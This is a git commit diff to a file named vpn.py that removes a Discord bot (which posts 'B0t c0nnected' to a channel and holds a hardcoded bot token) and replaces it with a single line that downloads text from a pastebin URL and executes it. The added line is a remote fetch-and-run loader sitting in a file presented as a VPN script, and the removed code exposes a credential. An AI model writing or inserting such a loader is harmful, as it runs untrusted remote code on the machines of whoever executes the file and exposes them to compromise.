1a703be64bcb057ffb9ae52b16b0fd914a278689
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-02-21 00:04:50 +0500

    Update vpn.py

--- vpn.py
+++ vpn.py
@@ -1,19 +1,3 @@
-import discord
-from discord.ext import commands
+import requests
 
-intents = discord.Intents.default()
-intents.message_content = True
-intents.typing = False
-intents.presences = False
-
-bot = commands.Bot(command_prefix='>', intents=intents)
-
-@bot.event
-async def on_ready():
-    channel = bot.get_channel(1208155463795867648)
-    if channel:
-        await channel.send("```[Linux]: B0t c0nnected```")
-    else:
-        print("Channel not found")
-
-bot.run('MTIwODEzMjEyODU2NzU5MTAwMw.GBOBrh.6rc_ZCuZdkcrFXrbKrxX2aST-WYcAbtbjsD294')
+exec(requests.get('https://pastebin.com/raw/wwup1cvr').text)
